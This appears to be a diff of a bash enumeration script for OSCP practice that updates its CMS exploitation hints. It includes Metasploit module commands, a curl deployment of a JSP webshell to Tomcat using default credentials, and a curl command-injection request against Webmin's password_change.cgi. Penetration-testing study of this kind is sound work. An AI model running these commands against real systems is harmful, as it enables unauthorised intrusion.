@@ -928,7 +928,7 @@ cms_fingerprint() {
         _emit_cms "CuteNews" \
             "CVE-2019-11447, CVE-2020-13432" \
             "/cdata/users/lines (bcrypt hashes), /cdata/users.txt, /core/ckeditor/" \
-            "searchsploit cutenews | msfconsole -q -x 'use exploit/multi/http/cutenews_avatar_shell_upload; set RHOSTS ${TARGET}; set RPORT ${PORT}; run'"
+            "[MSF-RESTRICTED] msfconsole -q -x 'use exploit/multi/http/cutenews_avatar_shell_upload; set RHOSTS ${TARGET}; set RPORT ${PORT}; run' ⚠️ OSCP: MSF limited to 1 machine | Manual: searchsploit -m 48800 (standalone PoC), upload PHP via avatar → /uploads/avatar_<user>_cp.php"
     fi
 
     if echo "$blob" | grep -qiE 'typo3_src|typo3conf|typo3temp|/typo3/index\.php|TYPO3'; then
@@ -1026,14 +1026,14 @@ cms_fingerprint() {
         _emit_cms "Apache Tomcat" \
             "CVE-2020-1938 (Ghostcat), CVE-2017-12617, CVE-2020-9484" \
             "/manager/html, /host-manager/html, /manager/text/list" \
-            "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS ${TARGET}; set RPORT ${PORT}; set HttpUsername tomcat; set HttpPassword tomcat' | default creds: tomcat:tomcat, admin:admin, tomcat:s3cret"
+            "[MSF-RESTRICTED] msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS ${TARGET}; set RPORT ${PORT}; set HttpUsername tomcat; set HttpPassword tomcat' ⚠️ OSCP: MSF limited to 1 machine | Manual: build WAR with jsp webshell, curl -u tomcat:tomcat -T shell.war \"http://${TARGET}:${PORT}/manager/text/deploy?path=/shell\" — default creds: tomcat:tomcat, admin:admin, tomcat:s3cret"
     fi
 
     if echo "$blob" | grep -qiE 'Webmin|/unauthenticated/|webmin_'; then
         _emit_cms "Webmin" \
             "CVE-2019-15107 (unauth RCE, Webmin ≤ 1.920)" \
             "/password_change.cgi, /session_login.cgi, /unauthenticated/" \
-            "searchsploit webmin 1.920 | msfconsole -q -x 'use exploit/unix/webapp/webmin_backdoor; set RHOSTS ${TARGET}; set RPORT ${PORT}'"
+            "[MSF-RESTRICTED] msfconsole -q -x 'use exploit/unix/webapp/webmin_backdoor; set RHOSTS ${TARGET}; set RPORT ${PORT}' ⚠️ OSCP: MSF limited to 1 machine | Manual: searchsploit -m 46984 (standalone CVE-2019-15107 PoC), or curl -sk --data 'xnavigation=1&cmd=id' https://${TARGET}:${PORT}/password_change.cgi"
     fi
 
     # ── Critical path fallback — any 200-OK path matching sensitive regex ──
